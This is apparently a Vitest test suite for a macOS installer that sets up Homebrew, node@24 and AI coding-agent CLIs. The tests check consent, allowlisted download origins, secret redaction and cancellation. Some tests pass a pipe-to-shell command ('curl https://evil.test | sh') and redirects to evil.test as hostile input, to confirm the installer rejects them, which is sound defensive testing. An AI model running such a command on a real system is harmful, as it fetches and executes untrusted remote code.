import { EventEmitter } from 'node:events'
import { describe, expect, it, vi } from 'vitest'
import {
  BASELINE_PHASE_IDS,
  HOMEBREW_INSTALLER_URL,
  HOMEBREW_PATH,
  NODE24_BIN,
  createHostToolsInstaller,
} from './installer.js'
import { AGENT_CATALOG, getAgentDefinition } from './catalog.js'

const AGENT_IDS = ['codex', 'claude', 'copilot', 'opencode']

function tool(status, path = null, version = null) {
  return { status, path, version }
}

function snapshot({
  homebrew = 'valid',
  baseline = 'valid',
  platform = 'darwin',
  arch = 'arm64',
  oldNode = false,
  node24Directory = NODE24_BIN,
  node24Prioritized = false,
  agentStates = {},
} = {}) {
  const supported = platform === 'darwin' && arch === 'arm64'
  const nodeDirectory = oldNode ? '/old/bin' : node24Directory
  const environmentEntries = node24Prioritized
    ? [nodeDirectory, '/opt/homebrew/bin', '/old/bin']
    : ['/old/bin', '/opt/homebrew/bin']
  return {
    status: supported ? 'supported' : 'unsupported',
    support: { status: supported ? 'supported' : 'unsupported', platform, arch },
    environment: supported ? {
      path: environmentEntries.join(':'),
      entries: environmentEntries,
      bundleRoots: ['/Applications/Hypercanvas.app/Contents/Resources'],
    } : null,
    homebrew: supported ? (homebrew === 'valid' ? tool('valid', HOMEBREW_PATH, '4.6.0') : tool(homebrew)) : tool('unsupported'),
    baseline: supported ? {
      status: baseline,
      minimumNodeMajor: 22,
      node: baseline === 'valid' ? tool('valid', `${nodeDirectory}/node`, oldNode ? '22.12.0' : '24.7.0') : tool('missing'),
      npm: baseline === 'valid' ? { ...tool('valid', `${nodeDirectory}/npm`, '11.5.1'), runtimeNodePath: `${nodeDirectory}/node` } : tool('missing'),
    } : { status: 'unsupported', minimumNodeMajor: 22, node: null, npm: null },
    agents: Object.fromEntries(AGENT_IDS.map((id) => {
      const status = agentStates[id] || 'missing'
      return [id, status === 'installed' ? tool('installed', `/host/agents/${id}`, '1.2.3') : tool(status, status === 'failed_verification' ? `/broken/${id}` : null)]
    })),
  }
}

function sequence(...values) {
  let index = 0
  return vi.fn(async () => structuredClone(values[Math.min(index++, values.length - 1)]))
}

function memoryFs() {
  const writes = []
  return {
    writes,
    mkdtemp: vi.fn(async (prefix) => `${prefix}fixture`),
    chmod: vi.fn(async () => {}),
    writeFile: vi.fn(async (path, content, options) => { writes.push({ path, content, options }) }),
    rm: vi.fn(async () => {}),
  }
}

function officialFetch({ url, body = '#!/bin/bash\nexit 0\n' } = {}) {
  const arrayBuffer = vi.fn(async () => Buffer.from(body))
  const fetch = vi.fn(async (requestedUrl) => ({
    ok: true,
    url: url || requestedUrl,
    headers: { get: () => String(Buffer.byteLength(body)) },
    arrayBuffer,
  }))
  fetch.arrayBuffer = arrayBuffer
  return fetch
}

function completingSpawn({ exitCode = 0, stdout = '', stderr = '' } = {}) {
  return vi.fn(() => {
    const child = new EventEmitter()
    child.stdout = new EventEmitter()
    child.stderr = new EventEmitter()
    child.kill = vi.fn()
    queueMicrotask(() => {
      if (stdout) child.stdout.emit('data', Buffer.from(stdout))
      if (stderr) child.stderr.emit('data', Buffer.from(stderr))
      child.emit('close', exitCode)
    })
    return child
  })
}

function sequencedSpawn(...exitCodes) {
  let index = 0
  return vi.fn(() => {
    const child = new EventEmitter()
    child.stdout = new EventEmitter()
    child.stderr = new EventEmitter()
    child.kill = vi.fn()
    const exitCode = exitCodes[Math.min(index++, exitCodes.length - 1)]
    queueMicrotask(() => child.emit('close', exitCode))
    return child
  })
}

function deferredSpawn() {
  let child
  const spawn = vi.fn(() => {
    child = new EventEmitter()
    child.stdout = new EventEmitter()
    child.stderr = new EventEmitter()
    child.kill = vi.fn(() => queueMicrotask(() => child.emit('close', null, 'SIGTERM')))
    return child
  })
  return { spawn, get child() { return child } }
}

function ids() {
  let value = 0
  return () => `id-${++value}`
}

function service(options = {}) {
  return createHostToolsInstaller({
    fetch: officialFetch(),
    fs: memoryFs(),
    temporaryRoot: () => '/safe/tmp',
    spawn: completingSpawn(),
    terminalHandoff: vi.fn(async () => ({ ok: true, exitCode: 0 })),
    generateId: ids(),
    now: () => Date.parse('2026-08-31T12:00:00.000Z'),
    ...options,
  })
}

async function expectCode(promise, code) {
  await expect(promise).rejects.toMatchObject({ code })
}

describe('host baseline install plans', () => {
  it('creates an immutable missing-Homebrew plan with exact ordered phases, disclosures, and selected agents', async () => {
    const installer = service({ preflight: sequence(snapshot({ homebrew: 'missing', baseline: 'missing' })) })
    const plan = await installer.createPlan({ selectedAgentIds: ['codex', 'claude'] })

    expect(plan.id).toBe('id-1')
    expect(plan.steps.map(({ id }) => id)).toEqual(BASELINE_PHASE_IDS)
    expect(plan.steps.map(({ action }) => action)).toEqual(['rerun', 'install', 'install', 'prioritize', 'verify', 'install-selected', 'verify'])
    expect(plan.selectedAgentIds).toEqual(['codex', 'claude'])
    expect(plan.disclosures).toMatchObject([
      { id: 'homebrew-terminal-handoff', origin: HOMEBREW_INSTALLER_URL, authentication: 'macos-terminal-user-managed' },
      { id: 'homebrew-node24', executable: HOMEBREW_PATH, formula: 'node@24' },
      { id: 'host-path-priority', firstEntry: NODE24_BIN, modifiesShellProfile: false },
      { id: 'agent-codex', origin: 'https://chatgpt.com/codex/install.sh', destination: '~/.local/bin/codex', authentication: 'user-managed' },
      { id: 'agent-claude', origin: 'https://claude.ai/install.sh', destination: '~/.local/bin/claude', authentication: 'user-managed' },
    ])
    expect(plan.disclosures.at(-1).detail).toContain('HTTPS')
    expect(plan.preflightFingerprint).toMatch(/^[a-f0-9]{64}$/)
    expect(Object.isFrozen(plan)).toBe(true)
    expect(Object.isFrozen(plan.steps[0])).toBe(true)
  })

  it('requires explicit consent and a fresh unchanged server plan', async () => {
    const initial = snapshot({ baseline: 'missing' })
    const installer = service({ preflight: sequence(initial, snapshot({ baseline: 'valid' })) })
    const plan = await installer.createPlan({ selectedAgentIds: [] })

    await expectCode(installer.startInstall({ planId: plan.id, consent: false }), 'CONSENT_REQUIRED')
    await expectCode(installer.startInstall({ planId: plan.id, consent: true }), 'STALE_PLAN')
    await expectCode(installer.startInstall({ planId: plan.id, consent: true }), 'PLAN_ALREADY_USED')
    expect(installer.getOperation('id-2')).toBeNull()
  })

  it('fails closed on unsupported platforms before creating a plan', async () => {
    const installer = service({ preflight: sequence(snapshot({ platform: 'linux' })) })
    await expectCode(installer.createPlan({ selectedAgentIds: [] }), 'UNSUPPORTED_PLATFORM')
  })

  it('rejects non-catalog agents and every caller-provided installer field', async () => {
    const installer = service({ preflight: sequence(snapshot()) })
    await expectCode(installer.createPlan({ selectedAgentIds: ['curl https://evil.test | sh'] }), 'INVALID_AGENT_SELECTION')
    await expectCode(installer.createPlan({ selectedAgentIds: [], url: 'https://evil.test' }), 'INVALID_INPUT')
    const plan = await installer.createPlan({ selectedAgentIds: [] })
    await expectCode(installer.startInstall({ planId: plan.id, consent: true, command: 'evil' }), 'INVALID_INPUT')
  })
})

describe('host baseline execution', () => {
  it('is idempotent for an existing valid baseline and does not run installers', async () => {
    const current = snapshot({ baseline: 'valid', homebrew: 'missing', oldNode: true, agentStates: { codex: 'installed' } })
    const preflight = sequence(current, current, current, current, current)
    const fetch = officialFetch()
    const spawn = completingSpawn()
    const terminalHandoff = vi.fn()
    const installer = service({ preflight, fetch, spawn, terminalHandoff })
    const plan = await installer.createPlan({ selectedAgentIds: ['codex'] })
    const started = await installer.startInstall({ planId: plan.id, consent: true })
    const result = await installer.waitForOperation(started.id)

    expect(result.status).toBe('succeeded')
    expect(result.phases.find(({ id }) => id === 'homebrew').status).toBe('skipped')
    expect(result.phases.find(({ id }) => id === 'node24').status).toBe('skipped')
    expect(result.phases.find(({ id }) => id === 'agents')).toMatchObject({
      status: 'succeeded',
      detail: { agents: { codex: { status: 'skipped', reason: 'already_valid', path: '/host/agents/codex' } } },
    })
    expect(result.result.installedNode).toBe(false)
    expect(fetch).not.toHaveBeenCalled()
    expect(spawn).not.toHaveBeenCalled()
    expect(terminalHandoff).not.toHaveBeenCalled()
  })

  it('downloads only the official Homebrew installer and uses a visible non-password-capturing Terminal handoff', async () => {
    const missing = snapshot({ homebrew: 'missing', baseline: 'missing' })
    const brewReady = snapshot({ homebrew: 'valid', baseline: 'missing' })
    const valid = snapshot({ homebrew: 'valid', baseline: 'valid', node24Prioritized: true })
    const fetch = officialFetch()
    const fs = memoryFs()
    const terminalHandoff = vi.fn(async () => ({ ok: true, exitCode: 0 }))
    const installer = service({ preflight: sequence(missing, missing, brewReady, brewReady, valid, valid), fetch, fs, terminalHandoff })
    const plan = await installer.createPlan({ selectedAgentIds: [] })
    const operation = await installer.startInstall({ planId: plan.id, consent: true })
    const result = await installer.waitForOperation(operation.id)

    expect(result.status).toBe('succeeded')
    expect(fetch).toHaveBeenCalledWith(HOMEBREW_INSTALLER_URL, expect.objectContaining({ method: 'GET', redirect: 'manual' }))
    expect(terminalHandoff).toHaveBeenCalledWith(expect.objectContaining({
      installerPath: '/safe/tmp/hypercanvas-homebrew-fixture/install.sh',
      command: { file: '/bin/bash', args: ['/safe/tmp/hypercanvas-homebrew-fixture/install.sh'] },
    }))
    expect(fs.writeFile).toHaveBeenCalledWith(expect.stringMatching(/install\.sh$/), expect.any(Uint8Array), { mode: 0o700, flag: 'wx' })
    expect(result.output.map(({ text }) => text).join('\n')).toContain('Authorization stays in Terminal')
    expect(result.output.map(({ text }) => text).join('\n')).not.toMatch(/password=/i)
  })

  it('installs node@24 using the absolute Homebrew path and prioritizes its bin directory', async () => {
    const missing = snapshot({ homebrew: 'valid', baseline: 'missing' })
    const valid = snapshot({
      homebrew: 'valid',
      baseline: 'valid',
      node24Directory: '/opt/homebrew/Cellar/node@24/24.7.0/bin',
      node24Prioritized: true,
    })
    const spawn = completingSpawn({ stdout: 'installed node@24' })
    const preflight = sequence(missing, missing, missing, valid, valid)
    const installer = service({ preflight, spawn })
    const plan = await installer.createPlan({ selectedAgentIds: [] })
    const operation = await installer.startInstall({ planId: plan.id, consent: true })
    const result = await installer.waitForOperation(operation.id)

    expect(result.status).toBe('succeeded')
    expect(spawn).toHaveBeenCalledTimes(1)
    expect(spawn).toHaveBeenCalledWith(HOMEBREW_PATH, ['install', 'node@24'], expect.objectContaining({ shell: false }))
    const processEnvironment = spawn.mock.calls[0][2].env
    expect(processEnvironment.PATH.split(':')[0]).toBe(NODE24_BIN)
    expect(result.result.hostEnvironment.firstEntry).toBe(NODE24_BIN)
    expect(preflight.mock.calls.at(-1)[0].env.HYPERCANVAS_HOST_PATH.split(':')[0]).toBe(NODE24_BIN)
    expect(result.result.baseline.node.path).toBe('/opt/homebrew/Cellar/node@24/24.7.0/bin/node')
  })

  it('retains completed Homebrew work as partial success when Node installation fails', async () => {
    const missing = snapshot({ homebrew: 'missing', baseline: 'missing' })
    const brewReady = snapshot({ homebrew: 'valid', baseline: 'missing' })
    const installer = service({
      preflight: sequence(missing, missing, brewReady, brewReady),
      spawn: completingSpawn({ exitCode: 1, stderr: 'token=secret failure' }),
    })
    const plan = await installer.createPlan({ selectedAgentIds: [] })
    const operation = await installer.startInstall({ planId: plan.id, consent: true })
    const result = await installer.waitForOperation(operation.id)

    expect(result).toMatchObject({
      status: 'failed',
      error: { code: 'NODE_INSTALL_FAILED', phase: 'node24' },
      result: { partialSuccess: true, installedHomebrew: true, installedNode: false },
    })
    expect(result.phases.find(({ id }) => id === 'homebrew').status).toBe('succeeded')
    expect(result.output.map(({ text }) => text).join('\n')).not.toContain('token=secret')
  })

  it('rejects a redirected non-allowlisted Homebrew installer without handing it off', async () => {
    const missing = snapshot({ homebrew: 'missing', baseline: 'missing' })
    const terminalHandoff = vi.fn()
    const installer = service({
      preflight: sequence(missing, missing),
      fetch: officialFetch({ url: 'https://evil.test/install.sh' }),
      terminalHandoff,
    })
    const plan = await installer.createPlan({ selectedAgentIds: [] })
    const operation = await installer.startInstall({ planId: plan.id, consent: true })
    const result = await installer.waitForOperation(operation.id)

    expect(result).toMatchObject({ status: 'failed', error: { code: 'HOMEBREW_DOWNLOAD_REJECTED', phase: 'homebrew' } })
    expect(terminalHandoff).not.toHaveBeenCalled()
  })

  it('cancels a running Node install and settles the polling snapshot', async () => {
    const missing = snapshot({ homebrew: 'valid', baseline: 'missing' })
    const process = deferredSpawn()
    const installer = service({ preflight: sequence(missing, missing, missing), spawn: process.spawn })
    const plan = await installer.createPlan({ selectedAgentIds: [] })
    const operation = await installer.startInstall({ planId: plan.id, consent: true })
    await vi.waitFor(() => expect(installer.getOperation(operation.id)).toMatchObject({ phase: 'node24', cancellation: { available: true } }))
    installer.cancelOperation(operation.id)
    const result = await installer.waitForOperation(operation.id)

    expect(process.child.kill).toHaveBeenCalledWith('SIGTERM')
    expect(result).toMatchObject({ status: 'cancelled', result: { installedNode: false } })
  })

  it('records cancellation during a Terminal handoff as requested but non-cancellable', async () => {
    const missing = snapshot({ homebrew: 'missing', baseline: 'missing' })
    const brewReady = snapshot({ homebrew: 'valid', baseline: 'missing' })
    let finishHandoff
    const terminalHandoff = vi.fn(() => new Promise((resolve) => { finishHandoff = resolve }))
    const installer = service({ preflight: sequence(missing, missing, brewReady), terminalHandoff })
    const plan = await installer.createPlan({ selectedAgentIds: [] })
    const operation = await installer.startInstall({ planId: plan.id, consent: true })
    await vi.waitFor(() => expect(installer.getOperation(operation.id)).toMatchObject({
      phase: 'homebrew',
      cancellation: { available: false, state: 'terminal_handoff_non_cancellable' },
    }))
    const requested = installer.cancelOperation(operation.id)
    expect(requested.cancellation).toEqual({ requested: true, available: false, state: 'terminal_handoff_non_cancellable' })
    finishHandoff({ ok: true, exitCode: 0 })
    const result = await installer.waitForOperation(operation.id)
    expect(result).toMatchObject({ status: 'cancelled', result: { installedHomebrew: true, partialSuccess: true } })
  })

  it('allows only one active operation and requires a fresh plan for retry', async () => {
    const missing = snapshot({ homebrew: 'valid', baseline: 'missing' })
    const process = deferredSpawn()
    const installer = service({ preflight: sequence(missing, missing, missing, missing), spawn: process.spawn })
    const firstPlan = await installer.createPlan({ selectedAgentIds: [] })
    const secondPlan = await installer.createPlan({ selectedAgentIds: [] })
    const operation = await installer.startInstall({ planId: firstPlan.id, consent: true })
    await vi.waitFor(() => expect(installer.getOperation(operation.id)?.phase).toBe('node24'))

    await expectCode(installer.startInstall({ planId: secondPlan.id, consent: true }), 'OPERATION_ACTIVE')
    await expectCode(installer.startInstall({ planId: firstPlan.id, consent: true }), 'PLAN_ALREADY_USED')
    installer.cancelOperation(operation.id)
    await installer.waitForOperation(operation.id)

    const retryPlan = await installer.createPlan({ selectedAgentIds: [] })
    expect(retryPlan.id).not.toBe(firstPlan.id)
  })
})

describe('official agent installers', () => {
  it.each(AGENT_CATALOG)('executes the reviewed $id adapter with code-owned origin, path, args, and environment', async (definition) => {
    const missing = snapshot()
    const installed = snapshot({ agentStates: { [definition.id]: 'installed' } })
    const fetch = officialFetch()
    const fs = memoryFs()
    const spawn = completingSpawn()
    const installer = service({
      preflight: sequence(missing, missing, missing, missing, installed, installed),
      fetch,
      fs,
      spawn,
    })
    const plan = await installer.createPlan({ selectedAgentIds: [definition.id] })
    const operation = await installer.startInstall({ planId: plan.id, consent: true })
    const result = await installer.waitForOperation(operation.id)

    const installerPath = `/safe/tmp/hypercanvas-${definition.id}-fixture/install.sh`
    const destinationDirectory = definition.install.pathDirectory.replace('~', process.env.HOME)
    expect(result).toMatchObject({
      status: 'succeeded',
      result: { agents: { [definition.id]: { status: 'succeeded', path: `/host/agents/${definition.id}` } } },
    })
    expect(fetch).toHaveBeenCalledTimes(1)
    expect(fetch).toHaveBeenCalledWith(definition.install.origin, expect.objectContaining({ method: 'GET', redirect: 'manual' }))
    expect(spawn).toHaveBeenCalledTimes(1)
    expect(spawn).toHaveBeenCalledWith('/bin/bash', [installerPath, ...definition.install.args], expect.objectContaining({ shell: false }))
    const environment = spawn.mock.calls[0][2].env
    expect(environment.PATH.split(':')[0]).toBe(destinationDirectory)
    expect(environment.HOME).toBe(process.env.HOME)
    expect(environment.GITHUB_TOKEN).toBeUndefined()
    for (const [key, value] of Object.entries(definition.install.env)) {
      expect(environment[key]).toBe(value.replace('~', process.env.HOME))
    }
    expect(fs.chmod).toHaveBeenCalledWith(`/safe/tmp/hypercanvas-${definition.id}-fixture`, 0o700)
    expect(fs.writeFile).toHaveBeenCalledWith(installerPath, expect.any(Uint8Array), { mode: 0o700, flag: 'wx' })
    expect(definition.install.integrity).toContain('vendor and HTTPS')
  })

  it('installs only selected missing or failed agents and preserves valid agents', async () => {
    const initial = snapshot({ agentStates: { codex: 'installed', claude: 'failed_verification' } })
    const repaired = snapshot({ agentStates: { codex: 'installed', claude: 'installed' } })
    const fetch = officialFetch()
    const spawn = completingSpawn()
    const installer = service({ preflight: sequence(initial, initial, initial, initial, repaired, repaired), fetch, spawn })
    const plan = await installer.createPlan({ selectedAgentIds: ['codex', 'claude'] })
    const operation = await installer.startInstall({ planId: plan.id, consent: true })
    const result = await installer.waitForOperation(operation.id)

    expect(result.status).toBe('succeeded')
    expect(result.result.agents).toMatchObject({
      codex: { status: 'skipped', reason: 'already_valid', path: '/host/agents/codex' },
      claude: { status: 'succeeded', path: '/host/agents/claude' },
    })
    expect(fetch).toHaveBeenCalledTimes(1)
    expect(fetch).toHaveBeenCalledWith(getAgentDefinition('claude').install.origin, expect.any(Object))
    expect(spawn).toHaveBeenCalledTimes(1)
  })

  it('rejects a selected installer redirected away from its reviewed official URLs', async () => {
    const current = snapshot()
    const spawn = completingSpawn()
    const fetch = officialFetch({ url: 'https://evil.test/install.sh' })
    const installer = service({
      preflight: sequence(current, current, current, current, current, current),
      fetch,
      spawn,
    })
    const plan = await installer.createPlan({ selectedAgentIds: ['opencode'] })
    const operation = await installer.startInstall({ planId: plan.id, consent: true })
    const result = await installer.waitForOperation(operation.id)

    expect(result).toMatchObject({
      status: 'failed',
      error: { code: 'AGENT_INSTALL_FAILED', failedAgentIds: ['opencode'] },
      result: { agents: { opencode: { status: 'failed', code: 'OPENCODE_DOWNLOAD_REJECTED' } } },
    })
    expect(spawn).not.toHaveBeenCalled()
    expect(fetch.arrayBuffer).not.toHaveBeenCalled()
  })

  it('fails a selected agent whose executable is not verified after a successful installer exit', async () => {
    const current = snapshot()
    const spawn = completingSpawn()
    const installer = service({ preflight: sequence(current, current, current, current, current, current), spawn })
    const plan = await installer.createPlan({ selectedAgentIds: ['claude'] })
    const operation = await installer.startInstall({ planId: plan.id, consent: true })
    const result = await installer.waitForOperation(operation.id)

    expect(result).toMatchObject({
      status: 'failed',
      result: { agents: { claude: { status: 'failed', code: 'AGENT_VERIFICATION_FAILED', path: null, verificationStatus: 'missing' } } },
    })
    expect(spawn).toHaveBeenCalledWith('/bin/bash', expect.any(Array), expect.objectContaining({ shell: false }))
  })

  it('attempts sibling agents after a failure and retains partial success', async () => {
    const missing = snapshot()
    const codexInstalled = snapshot({ agentStates: { codex: 'installed' } })
    const spawn = sequencedSpawn(0, 1)
    const installer = service({
      preflight: sequence(missing, missing, missing, missing, codexInstalled, codexInstalled, codexInstalled),
      spawn,
    })
    const plan = await installer.createPlan({ selectedAgentIds: ['codex', 'claude'] })
    const operation = await installer.startInstall({ planId: plan.id, consent: true })
    const result = await installer.waitForOperation(operation.id)

    expect(spawn).toHaveBeenCalledTimes(2)
    expect(result).toMatchObject({
      status: 'failed',
      error: { code: 'AGENT_INSTALL_FAILED', failedAgentIds: ['claude'] },
      result: {
        partialSuccess: true,
        agents: {
          codex: { status: 'succeeded', path: '/host/agents/codex' },
          claude: { status: 'failed', code: 'AGENT_INSTALL_PROCESS_FAILED' },
        },
      },
    })
  })

  it('cancels the running selected agent and skips unattempted siblings', async () => {
    const current = snapshot()
    const process = deferredSpawn()
    const installer = service({ preflight: sequence(current, current, current, current), spawn: process.spawn })
    const plan = await installer.createPlan({ selectedAgentIds: ['codex', 'claude'] })
    const operation = await installer.startInstall({ planId: plan.id, consent: true })
    await vi.waitFor(() => expect(installer.getOperation(operation.id)).toMatchObject({
      phase: 'agents',
      cancellation: { available: true, state: 'installing_codex' },
    }))
    installer.cancelOperation(operation.id)
    const result = await installer.waitForOperation(operation.id)

    expect(process.child.kill).toHaveBeenCalledWith('SIGTERM')
    expect(result).toMatchObject({
      status: 'cancelled',
      result: { agents: { codex: { status: 'failed', code: 'CANCELLED' }, claude: { status: 'skipped', reason: 'operation_cancelled' } } },
    })
  })

  it('never reaches an agent download when baseline Node/npm verification cannot succeed', async () => {
    const missing = snapshot({ baseline: 'missing' })
    const fetch = officialFetch()
    const spawn = completingSpawn({ exitCode: 1 })
    const installer = service({ preflight: sequence(missing, missing, missing), fetch, spawn })
    const plan = await installer.createPlan({ selectedAgentIds: ['codex'] })
    const operation = await installer.startInstall({ planId: plan.id, consent: true })
    const result = await installer.waitForOperation(operation.id)

    expect(result).toMatchObject({ status: 'failed', error: { code: 'NODE_INSTALL_FAILED', phase: 'node24' } })
    expect(fetch).not.toHaveBeenCalled()
    expect(spawn).toHaveBeenCalledTimes(1)
    expect(spawn).toHaveBeenCalledWith(HOMEBREW_PATH, ['install', 'node@24'], expect.any(Object))
  })
})
